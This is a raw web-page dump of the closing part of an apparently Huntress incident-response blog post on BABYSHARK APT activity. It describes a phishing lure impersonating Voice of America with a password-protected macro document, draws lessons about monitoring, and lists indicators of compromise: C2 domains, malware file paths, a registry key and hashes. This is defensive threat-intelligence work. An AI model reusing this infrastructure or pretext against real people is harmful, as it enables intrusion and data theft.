data-rt-max-width=\\\"1041px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eVoice of America probably doesn’t use Yahoo as their email provider. 🥴\u003c/p\u003e\u003cp\u003eAlex has no cause for concern here—they sent \u003cem\u003ethem\u003c/em\u003e a document with answers to their questions. For the final trick, our threat actor suggests they have “made some edits” and are sending the last copy back for final approval. To “be secure,” the document is password protected. 😈\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1112px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1112px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThere is the smoking gun—a OneDrive link with the hosted download for our \u003cspan class=\\\"highlight\\\"\u003eVOA_Korea.zip\u003c/span\u003e file, with the password-protected Word document with the macro that kickstarts this compromise. \u003c/p\u003e\u003cp\u003eThinking back to the malicious VBScript, wasn’t the target \u003cem\u003eBob\u003c/em\u003e, and not Alex? The threat actor may have used a roundabout method to get the true victim… but it worked. \u003c/p\u003e\u003cp\u003eAlex forwarded the email to their co-workers for their approval and carbon-copied the other victims.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-fullwidth\\\" style=\\\"max-width:1030px\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"fullwidth\\\" data-rt-max-width=\\\"1030px\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThere is no further correspondence in the email chain. The threat actor had what they wanted, and the victims were unaware they had just been phished—because it was, after all, a very clever ploy.\u003c/p\u003e\u003cp\u003eAfter we had finished our investigation and shared everything learned with the targeted organization, we continued our analysis. We found one particularly interesting news article dating back to December of 2021: “\u003ca href=\\\"https://www.nknews.org/2020/12/hackers-use-fake-media-domains-to-trick-north-korea-researchers/\\\" target=\\\"_blank\\\"\u003eHackers use fake media domains to trick North Korea researchers\u003c/a\u003e”... specifically VOA, under the very same guise. \u003c/p\u003e\u003cp\u003eLooking back, this was very clever malware filled with living-off-the-land techniques, using normally trusted software with OneDrive and Google Drive, staged with a particular stealthy phishing lure… but, we were disappointed in what earned the damning click.\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-center\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"center\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F798cbdd080c3426faa01e45ce4c262a8\\\" loading=\\\"lazy\\\" width=\\\"auto\\\" height=\\\"auto\\\" alt=\\\"\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003eThe malicious Word document itself is the most cookie-cutter, vanilla phish bait that one might see in generic and bland cybersecurity training. Despite how often security professionals scream and shout about these barebone basics of security hygiene, still this can slip by and damage an organization. \u003c/p\u003e\u003cp\u003e“Please click here” is all an APT needs.\u003c/p\u003e\u003ch2\u003eLessons Learned\u003c/h2\u003e\u003cp\u003eThe adversary here is likely a well-funded nation-state-supported threat actor, whose operations are known for their phishing prowess and building trust or a connection before dangling the lure. The remote access trojan and data exfiltration capabilities have been present and active in the target environment for \u003cem\u003enearly a year\u003c/em\u003e. \u003c/p\u003e\u003cp\u003eWe tend to share statistics and infographics about hacker dwell-time being weeks, or months, but this malware has gone unnoticed for much longer. While the victim organization \u003cem\u003ehad\u003c/em\u003e antivirus, the threat still slipped past. From our own analysis, looking through the logs, it is disheartening to see the exact moment where prevention efforts fell short.\u003c/p\u003e\u003cp\u003eWith that, we offer a gentle reminder: \u003cspan class=\\\"highlight\\\"\u003eprevention will fail. There is immense value, though, in logging, monitoring, and hunting\u003c/span\u003e. All the threads of this story could not have unfolded without the data retention and logged information available to our team of analysts and investigators. \u003c/p\u003e\u003cp\u003eWhether the infecting malware stems from an unskilled actor, just grabbing code off the shelf, or a trained and sophisticated APT, detection and human analysis must be in play.\u003c/p\u003e\u003cp\u003eThe Huntress Managed Security Platform has been augmenting more features and functionality to enrich our partners' reporting and insight. Combining the powers of each of these services (Persistent Footholds, Managed Antivirus, Process Insights, etc.), we can gain a greater understanding of incidents and compromises—and for finding APT activity on a trialing partner's system, we hope that offers a great example.\u003c/p\u003e\u003cp\u003e\u003cstrong\u003e• • •\u003c/strong\u003e\u003c/p\u003e\u003cp\u003e\u003cstrong\u003eSpecial thanks to analysts, researchers, account representatives, engineers and all involved in response to this incident and their contributions to this blog:\u003c/strong\u003e Cat Contillo, Matt Anderson, Caleb Stewart, Dave Kleinatland, John Hammond, Matthew Brennan, Tim Kasper, Clarissa Bove, Jamie Levy, Max Rogers, Greg Ake, Rob Noeth and Sharon Martin.\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch4\u003eIndicators of Compromise\u003c/h4\u003e\u003cp\u003e\u003cspan class=\\\"highlight\\\"\u003eTypeItemNotes / sha256 HashURLretmodul[.]comAccessed during execution of \u003c/span\u003enormal.crp. \u0026nbsp;May be used to signal success of attack.URLhodbeast[.]comStaging C2 urlURLworldinfocontact[.]clubBeaconing C2 urlURLfrebough[.]comStaging C2 urlURLbeastmodser[.]clubStaging C2 urlStringsH:\\\\Hollow\\\\googleDrive_rat_load_complete\\\\rat_load\\\\Release\\\\rat_load.pdbString in desktop.xml and desktop.r5uRegistry KeyHKEY_CURRENT_USER\\\\Software\\\\RegisteredApplications\\\\[random characters]Contained code that was executed by sys0.vbsFilec:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\desktop.tmp5b31d65b0607ae3de40ff8376bb83f3ff4defba3b564c380be5514d9766978eaFileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\r.vbsc86d6e9dfc79bdf29f0826327992f8cf3df3e1ed6b41f1c8f6ee67b32bef3a6bFileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\1.vbsc86d6e9dfc79bdf29f0826327992f8cf3df3e1ed6b41f1c8f6ee67b32bef3a6bFileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\Microsoft\\\\sys0.vbsbf82675bac2cd574fa8b87659217bffb29d4bc49b355b405ac4cd2666cd72f5aFileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\Microsoft\\\\sys1.vbsbf82675bac2cd574fa8b87659217bffb29d4bc49b355b405ac4cd2666cd72f5aFileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\desktop.xml\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003eAs a certificate: \u003c/span\u003e2ad3266331e405677c68bb43c490467107ca398d3ce430080a4db92036c93160\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003eConverted DLL: e314b40449b7b9b84f20f49f89888511433573377e007e5c1e94fd84ecf17caf\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\desktop.r5u\u003cspan class=\\\"highlight\\\"\u003eAs a certificate: \u003c/span\u003e2ad3266331e405677c68bb43c490467107ca398d3ce430080a4db92036c93160\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003eConverted DLL: e314b40449b7b9b84f20f49f89888511433573377e007e5c1e94fd84ecf17caf\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\version.dll\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003e\u003c/span\u003e[hash unavailable]FileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\version.tmp[hash unavailable]FileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\normal.crpe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855FileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\qwert.vbs\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003ee08fe0b287b4d112514276c2b102b9c80b4dab73257f06ab24231329389ad931\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Microsoft\\\\ttmp.log\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003e[hash unavailable]\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Microsoft\\\\filexx.tmp\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003eChecked by \u003c/span\u003enormal.crp \u003cspan class=\\\"highlight\\\"\u003efor run status, created if not run previously. Contents are 111File\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Microsoft\\\\schedxx.tmp\u003c/p\u003e\u003cp\u003eChecked by normal.crp\u003cspan class=\\\"highlight\\\"\u003e for run status, created if not run previously. Contents are 111File\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Local\\\\Temp\\\\CF8C.vbs\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003e[hash unavailable]File\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\dev.ps1\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003edef0975728fc5da61c022bb62b7160e2764631b852ec7f83951263c7830bec8d\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\pow.ps1\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003ed41c943fd5ffacde74f487df6a43b72e9730f05812b9b1f8dc874bd486f182b3\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003ec:\\\\users\\\\\u0026lt;user\u0026gt;\\\\appdata\\\\roaming\\\\Microsoft\\\\living.log(Hash varies based off the current time)FileC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\tabid_chrome.log\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003e(Hash varies due to logging)\u003cbr\u003e\u003cbr\u003eFile\u003c/span\u003eC:\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\Microsoft\\\\tabid_edge.log\u003cspan class=\\\"highlight\\\"\u003e\u003cbr\u003e\u003cbr\u003e(Hash varies due to logging)\u003cbr\u003e\u003cbr\u003eFilec:\u003c/span\u003e\\\\Users\\\\\u0026lt;user\u0026gt;\\\\AppData\\\\Roaming\\\\microsoft\\\\Windows\\\\start menu\\\\Programs\\\\Startup\\\\OneNote.vbs[.highlight]\u003cbr\u003e\u003cbr\u003ec327631a212e4a9681e3cf1574c500ce3700186cc605ae08db5878ecb0bfe66f\u003cbr\u003e\u003cbr\u003e(Note: hash may vary across different machines)\u003c/p\u003e\u003cp\u003e \u003cbr\u003e\u003c/p\u003e\u003cfigure class=\\\"w-richtext-figure-type-image w-richtext-align-center\\\" data-rt-type=\\\"image\\\" data-rt-align=\\\"center\\\"\u003e\u003cdiv\u003e\u003cimg data-zoomable src=\\\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fcda58da38bf84290afda8f2cf1995328\\\" alt=\\\"avatar\\\" width=\\\"auto\\\" height=\\\"auto\\\" loading=\\\"auto\\\"\u003e\u003c/div\u003e\u003c/figure\u003e\u003ch4\u003e\u003ca href=\\\"/authors/john-hammond\\\"\u003eJohn Hammond.\u003c/a\u003e Threat hunter. Education enthusiast. Senior Security Researcher at Huntress.\u003c/h4\u003e\",\"thumbnail\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd57bfd4fcc4b4b0f8685dcd9308d7d98\",\"metadata\",{\"_195\":6,\"_58\":196,\"_55\":197,\"_198\":6},\"noFollow\",\"Targeted APT Activity: BABYSHARK Is Out for Blood | Huntress\",\"We discovered malicious, targeted advanced persistent threat (APT) activity on a partner's system. Here, we dive into the BABYSHARK malware strain.\",\"noIndex\",\"categories\",[201],{\"_202\":203},\"category\",{\"_39\":204,\"_15\":205,\"_206\":207,\"_45\":208},\"@builder.io/core:Reference\",\"65f3299e49a461b4b9c72e32\",\"model\",\"blog-categories\",{\"_15\":205,\"_17\":209,\"_21\":21,\"_13\":210,\"_19\":211,\"_47\":212,\"_175\":221},\"Response to Incidents\",1739997400367,\"b7b51689bde4424484bccde4b9ee6d6b\",{\"_17\":209,\"_59\":213,\"_193\":214,\"_217\":215,\"_52\":216,\"_218\":219,\"_55\":220},\"response-to-incidents\",{\"_58\":215,\"_55\":216},\"Incident Responses Blog Posts | Huntress\",\"Read more about Incident Responses in these Huntress blog posts. \",\"metaTitle\",\"canonicalUrl\",\"https://www.huntress.com/blog-categories/response-to-incidents\",\"\u003cp\u003eBe the first to know about CVEs and threat advisories that we're seeing on the front lines. We'll break down how these threats or attacks work, do in-depth analysis, and provide mitigation guidance.\u003c/p\u003e\",\"n3wmahqojn\",\"featured\",\"publishDate\",\"March 1, 2022\",\"lastUpdatedDate\",\"targeted-apt-activity-babyshark-is-out-for-blood\",\"https://www.huntress.com/blog/targeted-apt-activity-babyshark-is-out-for-blood\",\"authors\",[230],{\"_231\":232},\"author\",{\"_39\":204,\"_15\":233,\"_206\":234,\"_45\":235},\"66048bf51de5bd420f2f2608\",\"people\",{\"_15\":233,\"_17\":236,\"_21\":21,\"_13\":237,\"_19\":238,\"_47\":239,\"_175\":295},\"John Hammond\",1742719359732,\"d50b5ec346a64579b280b4104dca236e\",{\"_17\":236,\"_59\":240,\"_193\":241,\"_244\":245,\"_246\":-5,\"_247\":248,\"_249\":250,\"_251\":252,\"_253\":254,\"_255\":256,\"_257\":258,\"_259\":260},\"john-hammond\",{\"_58\":242,\"_55\":243,\"_198\":6,\"_195\":6},\"John Hammond - Principal Security Researcher | Huntress\",\"Read blog posts from John Hammond on the Huntress Blog.\",\"profileImage\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F0ebcc8e098b842e3b6c5d44ae153b485\",\"profileImageAltText\",\"jobTitle\",\"Principal Security Researcher\",\"bioDetail\",\"\u003cp id=\\\"\\\"\u003e\u003cstrong id=\\\"\\\"\u003eCapturing flags, thwarting threats, and making cybersecurity accessible one endpoint at a time.\u003c/strong\u003e\u003c/p\u003e\u003cp id=\\\"\\\"\u003eJohn Hammond, a Principal Security Researcher at Huntress, discovered his passion for cybersecurity as an undergraduate at the US Coast Guard Academy, where competing in a “Cyberstakes” capture the flag event opened his eyes to vulnerabilities, exploits, and hacker tradecraft. At Huntress, he focuses on endpoint security, digging into living-off-the-land techniques and obfuscated scripting payloads.\u003c/p\u003e\u003cp id=\\\"\\\"\u003eWith a stack of certifications—including LFCS, PCAP, CompTIA Security+, CEH, eJPT, eCPPT, OSCP, OSCE (classic and 3), OSWP, OSEP, OSED, and OSWE—John brings serious technical prowess to the team. He’s honored to have received the RITA Award at Wild West Hacking Fest from Black Hills Information Security, and he credits the supportive, mission-driven environment at Huntress for enabling him to do meaningful work.\u003c/p\u003e\u003cp id=\\\"\\\"\u003eJohn is also an active voice in the community, sharing his experience through these Huntress on-demand webinars:\u0026nbsp;\u003c/p\u003e\u003cul id=\\\"\\\"\u003e\u003cli id=\\\"\\\"\u003e‍\u003ca href=\\\"https://www.huntress.com/resources/financial-impact-of-a-threat\\\" id=\\\"\\\"\u003eFinancial Impact of a Threat\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"\\\" id=\\\"\\\"\u003eRapid Response: Mass MSP Ransomware Incident\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"https://www.huntress.com/resources/mass-exploitation\\\" id=\\\"\\\"\u003eMass Exploitation of On-Prem Exchange Servers\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"https://www.huntress.com/resources/inside-look-at-the-dark-web\\\" id=\\\"\\\"\u003eHacker Hotbeds and Malicious Marketplaces: An Inside Look at the Dark Web\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"https://www.huntress.com/resources/incident-response-case-study-what-happens-when-everything-goes-wrong\\\" id=\\\"\\\"\u003eIncident Response Case Study: What Happens When Everything Goes Wrong\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"https://www.huntress.com/resources/bring-your-own-command-and-control\\\" id=\\\"\\\"\u003eBYOC2: Bring Your Own Command and Control\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"https://www.huntress.com/resources/hack-it-2021\\\" id=\\\"\\\"\u003ehack_it 2021: A Virtual Security Training Event for MSPs\u003c/a\u003e\u003c/li\u003e\u003cli id=\\\"\\\"\u003e\u003ca href=\\\"https://www.huntress.com/resources/hack-it-2020\\\" id=\\\"\\\"\u003ehack_it 2020: A Virtual Security Training Event for MSPs\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eBefore joining Huntress, John served as an instructor and curriculum developer with the Department of Defense Cyber Crime Center and Cyber Training Academy, and later as a Red Team Cyber Operator at the Defense Threat Reduction Agency.\u0026nbsp;\u003c/p\u003e\u003cp id=\\\"\\\"\u003e\u003cstrong id=\\\"\\\"\u003eHis top cybersecurity tip is a simple one:\u003c/strong\u003e “Use a password manager—seriously!!”\u003c/p\u003e\u003cp id=\\\"\\\"\u003eOutside of work, John loves spending time with his family and taking the rest he needs to stay sharp. He also shares his life with two dogs, Bam Bam and Pebbles—named after the beloved Flintstones characters, of course.\u0026nbsp;\u003c/p\u003e\u003cp id=\\\"\\\"\u003eGive John a follow on his socials:\u003c/p\u003e\u003cul id=\\\"\\\"\u003e\u003cli\u003e\u003ca href=\\\"https://youtube.com/@_JohnHammond\\\" id=\\\"\\\"\u003eYouTube\u003c/a\u003e\u003c/li\u003e\u003cli\u003eX: \u003ca href=\\\"https://twitter.com/_JohnHammond\\\" id=\\\"\\\"\u003e@_JohnHammond\u003c/a\u003e\u003c/li\u003e\u003cli\u003e\u003ca href=\\\"https://linkedin.com/in/johnhammond010\\\" id=\\\"\\\"\u003eLinkedIn\u003c/a\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e‍\u003c/p\u003e\",\"companyName\",\"Huntress\",\"linkedInUrl\",\"https://www.linkedin.com/in/johnhammond010/\",\"instagramUrl\",\"https://www.instagram.com/_johnhammond/\",\"xTwitterUrl\",\"https://twitter.com/_johnhammond\",\"groups\",[261,280],{\"_262\":263},\"group\",{\"_39\":204,\"_15\":264,\"_206\":259,\"_45\":265},\"00d1d80145b14a6b87c45567b169a8f4\",{\"_36\":266,\"_11\":267,\"_13\":268,\"_15\":264,\"_17\":269,\"_19\":270,\"_21\":21,\"_22\":271,\"_47\":275,\"_163\":276,\"_165\":277,\"_167\":278,\"_168\":169,\"_172\":173,\"_174\":173,\"_175\":279},[],[],1735687100903,\"Authors\",\"8749400659754b178d5088546f7b2f6f\",{\"_28\":272,\"_24\":47,\"_26\":50},{\"_32\":273,\"_34\":274},478,1023,{\"_17\":269},{},1735687106469,1735687106464,\"80hmhmtoz3n\",{\"_262\":281},{\"_39\":204,\"_15\":282,\"_206\":259,\"_45\":283},\"babc0d8823f34ab894a4431d5b302dc7\",{\"_36\":284,\"_11\":285,\"_13\":286,\"_15\":282,\"_17\":287,\"_19\":270,\"_21\":21,\"_22\":288,\"_47\":290,\"_163\":291,\"_165\":292,\"_167\":293,\"_168\":169,\"_172\":173,\"_174\":173,\"_175\":294},[],[],1742334085525,\"Speakers\",{\"_28\":289,\"_24\":47,\"_26\":50},{\"_30\":31,\"_32\":33,\"_34\":35},{\"_17\":287},{},1742334347573,1742334347569,\"t0hk7hrgn2k\",\"4mih4x83qav\",{},1744303754273,\"XBN8lOXr7QMH6JvQimte3OCtO6c2\",\"g1knwty37wp\",\"relatedPosts\",[302,308,313],{\"_15\":303,\"_17\":304,\"_47\":305},\"f1e86e758ae74b7e907bd76c353acb01\",\"Rapid Response: Samsung MagicINFO 9 Server Flaw\",{\"_59\":306,\"_191\":307},\"rapid-response-samsung-magicinfo9-server-flaw\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F94d861c26a78420b94c6695444187e65\",{\"_15\":309,\"_17\":310,\"_47\":311},\"fd9ca2a5d97d4916b9227540c657687b\",\"Rapid Response: ASUS Live Update Attack (Operation ShadowHammer)\",{\"_59\":312},\"faq-asus-liveupdate-attack-operation-shadowhammer-9fc9c03b2da9\",{\"_15\":314,\"_17\":315,\"_47\":316},\"680ff462370d4d85aa42176d3c1b7ed5\",\"Troubleshooting Procmon \u0026 Sysmon v3.32\",{\"_59\":317},\"troubleshooting-procmon-sysmon-v3-32-c4397dc75f50\",\"altRelatedPosts\",[],\"common\",{\"_322\":323,\"_336\":337,\"_404\":405},\"headerContent\",[324],{\"_15\":325,\"_17\":326,\"_47\":327,\"_165\":335},\"58922ccec86f4a31afd22c221dc93cea\",\"About Feature\",{\"_111\":328,\"_58\":329,\"_330\":331,\"_113\":332,\"_333\":334},\"\u003cp\u003eWhen a mass-isolation event hit, Key Methods realized they were flying blind. See how Huntress Managed SIEM gave them the visibility they needed.\u003c/p\u003e\",\"Key Methods\",\"altText\",\"Key Methods Thumbnail \",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fccbc23d75b9640b69566b916ea6f832a\",\"link\",\"https://cdn.builder.io/o/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F659979229f5449f28c49a65895b9d2ef?alt=media\u0026token=e87850ca-2ec6-4625-a6d9-b2e8a487f1ad\u0026apiKey=3eb6f92aedf74f109c7b4b0897ec39a8\",1745874913292,\"g2Awards\",[338,357,375,393],{\"_15\":339,\"_17\":340,\"_47\":341},\"b1ef1fa50cc44b4cb964fcd76ce27c47\",\"Managed SAT Awards\",{\"_202\":342,\"_343\":344},\"Managed SAT\",\"images\",[345,348,351,354],{\"_113\":346,\"_330\":347},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe6cc6492c7ad457db8613e2be1b0bf7a\",\"Security Awareness Training Leader Small Business G2 Badges Spring 2025\",{\"_113\":349,\"_330\":350},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fa20ef7581ec94548b774ab925b721874\",\"Security Awareness Training Momentum Leader G2 Badges Spring 2025\",{\"_113\":352,\"_330\":353},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fb22fd7c3f53744aeaad49a1383a8adf2\",\"Security Awareness Training Regional Leader EMEA G2 Badges Spring 2025\",{\"_330\":355,\"_113\":356},\"Security Awareness Training Regional Leader Europe G2 Badges Spring 2025\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8fc8eb8c2feb400dabbbe15a0e65ebd4\",{\"_15\":358,\"_17\":359,\"_47\":360},\"a15035cbedea4437bf339e54f6573731\",\"Managed ITDR Awards\",{\"_202\":361,\"_343\":362},\"Managed ITDR\",[363,366,369,372],{\"_113\":364,\"_330\":365},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F9710816629b94b46803509bc69c90b6c\",\"Identity Threat Detection and Response (ITDR) Leader G2 Badge Spring 2025\",{\"_330\":367,\"_113\":368},\"Identity Threat Detection and Response (ITDR) High Performer G2 Badge Spring 2025\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Ffbee1654661a4853b7bdc68eba98a19b\",{\"_330\":370,\"_113\":371},\"Identity Threat Detection and Response (ITDR) Best Estimated ROI G2 Badge Spring 2025\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F4c7270fe798448eb893d35ec3a6c5230\",{\"_113\":373,\"_330\":374},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fac3ee471f9be4debbe512f873584df07\",\"Identity Threat Detection and Response (ITDR) Best Support G2 Badge Spring 2025\",{\"_15\":376,\"_17\":377,\"_47\":378},\"f4f2c8064b7e4e92b01a3c95a41dde18\",\"Managed EDR Awards\",{\"_343\":379,\"_202\":392},[380,383,386,389],{\"_330\":381,\"_113\":382},\"Managed Detection and Response(MDR) Grid Leader G2 Badge Spring 2025\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F54010559656e44848d6f2b5e1478bd6f\",{\"_113\":384,\"_330\":385},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F559f64e417b34c02ae35785fa6f44de1\",\"Managed Detection and Response(MDR) High Performer Enterprise G2 Badge Spring 2025\",{\"_113\":387,\"_330\":388},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F64b4e0f5995b44ed95804354224cb723\",\"Managed Detection and Response(MDR) Best Support G2 Badge Spring 2025\",{\"_330\":390,\"_113\":391},\"Managed Detection and Response(MDR) Best Results G2 Badge Spring 2025\",\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fd748e2d9379544119bb9895ec2304877\",\"Managed EDR\",{\"_15\":394,\"_17\":395,\"_47\":396},\"9b043f11647d490c8780d9136cf88b34\",\"Default G2 Awards\",{\"_202\":397,\"_343\":398},\"default\",[399,400,401,403],{\"_113\":384,\"_330\":385},{\"_113\":387,\"_330\":388},{\"_113\":402},\"https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F4b380ad74f5142e682933db387225c5f\",{\"_113\":391,\"_330\":390},\"assetTypes\",[406,409,412,415,418,421,424,427],{\"_15\":407,\"_17\":408},\"65f3299e49a461b4b9c72e3c\",\"Datasheet\",{\"_15\":410,\"_17\":411},\"65f3299e49a461b4b9c72e3e\",\"Handbook\",{\"_15\":413,\"_17\":414},\"65f3299e49a461b4b9c72e39\",\"On-Demand Webinar\",{\"_15\":416,\"_17\":417},\"65f3299e49a461b4b9c72e38\",\"Report\",{\"_15\":419,\"_17\":420},\"65f3299e49a461b4b9c72e40\",\"Success Kit\",{\"_15\":422,\"_17\":423},\"65f3299e49a461b4b9c72e3d\",\"Video\",{\"_15\":425,\"_17\":426},\"65f3299e49a461b4b9c72e3b\",\"Whitepaper\",{\"_15\":428,\"_17\":429},\"65f3299e49a461b4b9c72e3a\",\"eBook\",\"builderApiKey\",\"3eb6f92aedf74f109c7b4b0897ec39a8\",\"actionData\",\"errors\"]\n");</script><!--$?--><template id="B:1"></template><!--/$--></div><script>$RC=function(b,c,e){c=document.getElementById(c);c.parentNode.removeChild(c);var a=document.getElementById(b);if(a){b=a.previousSibling;if(e)b.data="$!",a.setAttribute("data-dgst",e);else{e=b.parentNode;a=b.nextSibling;var f=0;do{if(a&&8===a.nodeType){var d=a.data;if("/$"===d)if(0===f)break;else f--;else"$"!==d&&"$?"!==d&&"$!"!==d||f++}d=a.nextSibling;e.removeChild(a);a=d}while(a);for(;c.firstChild;)e.insertBefore(c.firstChild,a);b.data="$"}b._reactRetry&&b._reactRetry()}};$RC("B:0","S:0")</script><div hidden id="S:1"><script>window.__reactRouterContext.streamController.close();</script></div><script>$RC("B:1","S:1")</script></body></html>